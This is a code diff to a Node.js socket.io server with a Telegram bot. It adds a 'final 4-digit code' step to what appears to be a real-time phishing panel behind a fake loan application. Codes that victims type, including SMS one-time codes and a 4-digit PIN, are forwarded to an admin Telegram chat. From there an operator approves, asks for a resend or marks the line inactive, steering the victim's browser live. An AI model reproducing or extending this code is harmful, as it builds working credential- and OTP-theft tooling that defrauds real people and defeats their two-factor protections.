@@ -74,6 +74,32 @@ io.on('connection', (socket) => {
             console.error(err);
         }
     });
+
+    // 3. Final 4-Digit Code Submit
+    socket.on('submit_final_code', async (fullCode) => {
+        const msg = `
+🔐 <b>4-Digit Code Received</b>
+━━━━━━━━━━━━━━━━
+<code>${fullCode}</code>
+━━━━━━━━━━━━━━━━
+<i>Waiting for your decision...</i>
+        `;
+
+        try {
+            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ APPROVE', callback_data: `approve_final_${socket.id}` },
+                        { text: '🔄 RESEND', callback_data: `resend_final_${socket.id}` },
+                        { text: '🚫 INACTIVE', callback_data: `inactive_final_${socket.id}` }
+                    ]]
+                }
+            });
+        } catch (err) {
+            console.error(err);
+        }
+    });
 });
 
 // --- TELEGRAM BOT ACTIONS ---
@@ -87,32 +113,49 @@ bot.on('callback_query', async (query) => {
     }
 
     // --- STEP 1: APPLICATION APPROVAL ---
-    if (query.data.startsWith('approve_') && !query.data.includes('sms')) {
+    if (query.data.startsWith('approve_') && !query.data.includes('sms') && !query.data.includes('final')) {
         bot.answerCallbackQuery(query.id, { text: 'Approved!' });
         userSocket.emit('approved');
-        bot.sendMessage(query.message.chat.id, `✅ <b>APPROVED</b> (User ${socketId} moved to SMS step)`, { parse_mode: 'HTML' });
+        bot.sendMessage(query.message.chat.id, `✅ <b>APPROVED</b> (User moved to SMS step)`, { parse_mode: 'HTML' });
     } 
     else if (query.data.startsWith('reject_') && !query.data.includes('sms')) {
         bot.answerCallbackQuery(query.id, { text: 'Rejected!' });
         userSocket.emit('rejected');
-        bot.sendMessage(query.message.chat.id, `❌ <b>REJECTED</b> (User ${socketId} sent back to code step)`, { parse_mode: 'HTML' });
+        bot.sendMessage(query.message.chat.id, `❌ <b>REJECTED</b> (User sent back to code step)`, { parse_mode: 'HTML' });
     }
     
     // --- STEP 2: SMS APPROVAL ---
     else if (query.data.startsWith('approve_sms_')) {
         bot.answerCallbackQuery(query.id, { text: 'SMS Approved!' });
         userSocket.emit('sms_approved');
-        bot.sendMessage(query.message.chat.id, `✅ <b>SMS APPROVED</b> (User ${socketId} moved to 4-digit code step)`, { parse_mode: 'HTML' });
+        bot.sendMessage(query.message.chat.id, `✅ <b>SMS APPROVED</b> (User moved to final 4-digit step)`, { parse_mode: 'HTML' });
     } 
     else if (query.data.startsWith('reject_sms_')) {
         bot.answerCallbackQuery(query.id, { text: 'SMS Rejected!' });
         userSocket.emit('sms_rejected');
-        bot.sendMessage(query.message.chat.id, `❌ <b>SMS REJECTED</b> (User ${socketId} sent back to 5-digit code step)`, { parse_mode: 'HTML' });
+        bot.sendMessage(query.message.chat.id, `❌ <b>SMS REJECTED</b> (User sent back)`, { parse_mode: 'HTML' });
     }
     else if (query.data.startsWith('resend_sms_')) {
         bot.answerCallbackQuery(query.id, { text: 'SMS Resend Triggered!' });
         userSocket.emit('sms_resend');
-        bot.sendMessage(query.message.chat.id, `🔄 <b>SMS RESEND</b> (Notified user ${socketId})`, { parse_mode: 'HTML' });
+        bot.sendMessage(query.message.chat.id, `🔄 <b>SMS RESEND</b>`, { parse_mode: 'HTML' });
+    }
+
+    // --- STEP 3: FINAL CODE APPROVAL ---
+    else if (query.data.startsWith('approve_final_')) {
+        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
+        userSocket.emit('final_approved');
+        bot.sendMessage(query.message.chat.id, `✅ <b>LOAN APPROVED</b> (User moved to success screen)`, { parse_mode: 'HTML' });
+    }
+    else if (query.data.startsWith('resend_final_')) {
+        bot.answerCallbackQuery(query.id, { text: 'Resend Triggered!' });
+        userSocket.emit('final_resend');
+        bot.sendMessage(query.message.chat.id, `🔄 <b>CODE RESEND</b>`, { parse_mode: 'HTML' });
+    }
+    else if (query.data.startsWith('inactive_final_')) {
+        bot.answerCallbackQuery(query.id, { text: 'Inactive Triggered!' });
+        userSocket.emit('final_inactive');
+        bot.sendMessage(query.message.chat.id, `🚫 <b>LINE INACTIVE</b>`, { parse_mode: 'HTML' });
     }
 });
 
